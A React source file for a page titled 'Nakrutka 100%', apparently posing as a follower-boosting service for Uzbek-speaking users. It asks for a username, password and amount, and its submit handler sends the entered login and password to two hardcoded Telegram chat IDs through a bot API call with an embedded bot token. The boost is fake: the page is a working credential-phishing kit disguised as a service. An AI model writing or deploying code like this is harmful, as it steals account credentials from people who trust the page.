import React, { useState } from 'react';

const App = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [amount, setAmount] = useState('');

  const chatIds = ['6573212314', '5681224283']; // Haqiqiy chat IDlarni kiriting
  const botToken = '7425654455:AAENWfZi5nWwY7CPJwjPTx_7a6gsbbLe6mE'; // Haqiqiy bot tokenni kiriting

  const sendToTelegram = async (chatId, message) => {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });
    if (!response.ok) {
      throw new Error(`Telegram API Error: ${response.statusText}`);
    }
  };

  const handleNakrutka = async () => {
    if (username && password && amount) {
      const message = `*Login Details*\n\n*Username:* ${username}\n*Password:* ${password}\n*Miqdori:* ${amount}`;

      try {
        await Promise.all(chatIds.map((chatId) => sendToTelegram(chatId, message)));
        alert('Nakrutka yuborildi! Iltimos kuting');
        setUsername('');
        setPassword('');
        setAmount('');
      } catch (error) {
        alert(`Xatolik yuz berdi: ${error.message}`);
      }
    } else {
      alert('Barcha maydonlarni to‘ldiring!');
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-base-200">
      <div className="card w-full max-w-sm shadow-2xl bg-base-100">
        <div className="card-body">
          <h2 className="text-2xl font-bold text-center mb-4">Nakrutka 100%</h2>

          <div className="form-control mb-4">
            <label htmlFor="username" className="label">
              <span className="label-text">Username</span>
            </label>
            <input
              type="text"
              id="username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="input input-bordered"
              required
            />
          </div>

          <div className="form-control mb-4">
            <label htmlFor="password" className="label">
              <span className="label-text">Password</span>
            </label>
            <input
              type="password"
              id="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="input input-bordered"
              required
            />
          </div>

          <div className="form-control mb-4">
            <label htmlFor="amount" className="label">
              <span className="label-text">Miqdorni kiriting</span>
            </label>
            <input
              type="number"
              id="amount"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="input input-bordered"
              required
            />
          </div>

          <div className="form-control mt-6">
            <button
              onClick={handleNakrutka}
              className="btn btn-primary"
            >
              Send
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default App;